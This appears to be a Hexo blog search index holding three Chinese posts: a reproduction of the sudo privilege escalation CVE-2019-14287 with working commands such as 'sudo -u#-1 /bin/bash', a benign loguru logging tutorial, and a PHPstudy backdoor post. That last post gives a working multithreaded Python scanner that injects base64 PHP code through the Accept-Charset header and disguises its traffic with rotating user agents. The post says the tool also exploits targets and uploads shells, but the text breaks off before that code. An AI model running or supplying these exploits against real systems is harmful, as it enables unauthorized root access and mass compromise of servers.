<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2019-14287 linux sudo版本小于1.8.28本地root权限提升</title>
    <url>/2019/10/16/CVE-2019-14287-linux-sudo%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8E1-8-28%E6%9C%AC%E5%9C%B0root%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    <content><![CDATA[<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>当sudo配置为允许用户以任意方式运行命令时用户通过Runas规范中的ALL关键字，可以通过指定用户ID为-1或4294967295以root用户身份执行命令。</p>
<p>具有足够sudo权限的用户可以使用它来运行Runas规范明确禁止使用的root命令，以这种方式运行的命令的日志条目将列出目标用户为4294967295而不是root。</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="查看sudo版本"><a href="#查看sudo版本" class="headerlink" title="查看sudo版本"></a>查看sudo版本</h4><p><code>sudo -V</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571156178.5.png" alt></p>
<h4 id="为新增加的toml用户修改-etc-sudoers文件"><a href="#为新增加的toml用户修改-etc-sudoers文件" class="headerlink" title="为新增加的toml用户修改/etc/sudoers文件"></a>为新增加的toml用户修改/etc/sudoers文件</h4><p>限制权限</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571156430.1.png" alt></p>
<p>本地权限提升</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 id</span></span><br><span class="line">sudo -u<span class="comment">#4294967295 id</span></span><br><span class="line">sudo -u<span class="comment">#-1 /bin/bash</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571156890.88.png" alt></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://segmentfault.com/a/1190000020694980" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020694980</a></p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 中更优雅的日志记录方案——loguru</title>
    <url>/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/</url>
    <content><![CDATA[<h3 id="python日志记录方案"><a href="#python日志记录方案" class="headerlink" title="python日志记录方案"></a>python日志记录方案</h3><blockquote>
<p>在 Python 中，一般情况下我们可能直接用自带的 logging 模块来记录日志，包括我之前的时候也是一样。在使用时我们需要配置一些 Handler、Formatter 来进行一些处理，比如把日志输出到不同的位置，或者设置一个不同的输出格式，或者设置日志分块和备份。但其实个人感觉 logging 用起来其实并不是那么好用，其实主要还是配置较为繁琐。</p>
</blockquote>
<h3 id="更优雅的方式"><a href="#更优雅的方式" class="headerlink" title="更优雅的方式"></a>更优雅的方式</h3><p><strong>loguru</strong></p>
<blockquote>
<p>loguru不需要配置什么东西，直接引入一个 logger，然后调用其 debug 方法即可。在 loguru 里面有且仅有一个主要对象，那就是 logger，loguru 里面有且仅有一个 logger，而且它已经被提前配置了一些基础信息，比如比较友好的格式化、文本颜色信息等等。</p>
</blockquote>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><code>pip3 install loguru</code></p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="输出日志"><a href="#输出日志" class="headerlink" title="输出日志"></a>输出日志</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="输出到文件"><a href="#输出到文件" class="headerlink" title="输出到文件"></a>输出到文件</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_&#123;time&#125;.log"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日志规则"><a href="#日志规则" class="headerlink" title="日志规则"></a>日志规则</h5><p>设置日志格式，过滤器，日志级别</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">""</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.debug(<span class="string">"这是一条debug日志"</span>)</span><br><span class="line">logger.info(<span class="string">"这是一条info日志"</span>)</span><br></pre></td></tr></table></figure>
<h5 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h5><p>文件管理方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"file_1.log"</span>, rotation=<span class="string">"500 MB"</span>)    <span class="comment"># 文件过大就会重新生成一个文件</span></span><br><span class="line">logger.add(<span class="string">"file_2.log"</span>, rotation=<span class="string">"12:00"</span>)     <span class="comment"># 每天12点创建新文件</span></span><br><span class="line">logger.add(<span class="string">"file_3.log"</span>, rotation=<span class="string">"1 week"</span>)    <span class="comment"># 文件时间过长就会创建新文件</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_X.log"</span>, retention=<span class="string">"10 days"</span>)  <span class="comment"># 一段时间后会清空</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"file_Y.log"</span>, compression=<span class="string">"zip"</span>)    <span class="comment"># 保存zip格式</span></span><br></pre></td></tr></table></figure>
<h5 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"somefile.log"</span>, enqueue=<span class="keyword">True</span>)  <span class="comment"># 异步写入</span></span><br><span class="line"></span><br><span class="line">logger.add(<span class="string">"somefile.log"</span>, serialize=<span class="keyword">True</span>)  <span class="comment"># 序列化为json</span></span><br></pre></td></tr></table></figure>
<h5 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">logger.add(<span class="string">"file.log"</span>, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125; | &#123;level&#125; | &#123;message&#125;"</span>)</span><br></pre></td></tr></table></figure>
<p>配合notifiers模块<br>github： <a href="https://github.com/notifiers/notifiers" target="_blank" rel="noopener">https://github.com/notifiers/notifiers</a><br>文档：<a href="https://notifiers.readthedocs.io/en/latest/" target="_blank" rel="noopener">https://notifiers.readthedocs.io/en/latest/</a></p>
<h5 id="在工程中创建多个文件处理器对象并解决中文乱码问题"><a href="#在工程中创建多个文件处理器对象并解决中文乱码问题" class="headerlink" title="在工程中创建多个文件处理器对象并解决中文乱码问题"></a>在工程中创建多个文件处理器对象并解决中文乱码问题</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line"></span><br><span class="line">log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/my_first.log'</span>)</span><br><span class="line">err_log_file_path = os.path.join(BASE_DIR,<span class="string">'Log/error.log'</span>)</span><br><span class="line"></span><br><span class="line">logger.add(sys.stderr, format=<span class="string">"&#123;time&#125; &#123;level&#125; &#123;message&#125;"</span>, filter=<span class="string">"my_noudle"</span>, level=<span class="string">"INFO"</span>)</span><br><span class="line"></span><br><span class="line">logger.add(log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.add(err_log_file_path, rotation=<span class="string">"500 MB"</span>, encoding=<span class="string">'utf-8'</span>,</span><br><span class="line">           level=<span class="string">'ERROR'</span>)  <span class="comment"># Automatically rotate too big file</span></span><br><span class="line">logger.debug(<span class="string">"That's it, beautiful and simple logging!"</span>)</span><br><span class="line">logger.debug(<span class="string">"中文日志可以不"</span>)</span><br><span class="line">logger.error(<span class="string">"严重错误"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020366.4.png" alt></p>
<h5 id="Traceback-记录"><a href="#Traceback-记录" class="headerlink" title="Traceback 记录"></a>Traceback 记录</h5><blockquote>
<p>在很多情况下，如果遇到运行错误，而我们在打印输出 log 的时候万一不小心没有配置好 Traceback 的输出，很有可能我们就没法追踪错误所在了。但用了 loguru 之后，我们用它提供的装饰器就可以直接进行 Traceback 的记录。<strong>用 loguru 可以非常方便地实现日志追踪</strong></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"></span><br><span class="line"><span class="meta">@logger.catch</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_function</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line">    <span class="comment"># An error? It's caught anyway!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> / (x + y + z)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_function(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1571020539.21.png" alt></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzNzA4NDk3Nw==&amp;mid=2457738232&amp;idx=1&amp;sn=bfc6437b494249270d2b6dc3469eda61&amp;chksm=ff44b3a6c8333ab010268aed413da647f711839dbf8ba8b73d06b9502a4ba95482b11606f81b&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1571014978932&amp;sharer_shareid=b4f68ebe4eb5286506b3d3b1a76fd4c7#rd" target="_blank" rel="noopener">Python 中更优雅的日志记录方案</a></p>
<p><a href="https://loguru.readthedocs.io/en/stable/index.html" target="_blank" rel="noopener">loguru官方文档</a></p>
<p><a href="http://www.manongjc.com/detail/8-xkpixvxrrbkbqxw.html" target="_blank" rel="noopener">Python 第三方日志框架loguru使用</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>loguru</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPstudy后门漏洞POC-EXP编写</title>
    <url>/2019/10/14/PHPstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9EPOC-EXP%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h3 id="PHPstudy后门漏洞POC-EXP编写"><a href="#PHPstudy后门漏洞POC-EXP编写" class="headerlink" title="PHPstudy后门漏洞POC-EXP编写"></a>PHPstudy后门漏洞POC-EXP编写</h3><blockquote>
<p>phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后门漏洞的检测、利用以及直接上传shell。</p>
</blockquote>
<h3 id="代码-and-效果"><a href="#代码-and-效果" class="headerlink" title="代码 and 效果"></a>代码 and 效果</h3><h4 id="批量检测POC"><a href="#批量检测POC" class="headerlink" title="批量检测POC"></a>批量检测POC</h4><p>支持自定义输入目标文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = <span class="string">"phpinfo();"</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">    headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">    headers[<span class="string">'Accept-Charset'</span>] = payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url,headers=headers,timeout=TIME_OUT)</span><br><span class="line">        result.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(result.content):</span><br><span class="line">            print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'success.txt'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(url + <span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()</span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png" alt></p>
<h4 id="带参数检测、利用、传shell"><a href="#带参数检测、利用、传shell" class="headerlink" title="带参数检测、利用、传shell"></a>带参数检测、利用、传shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS 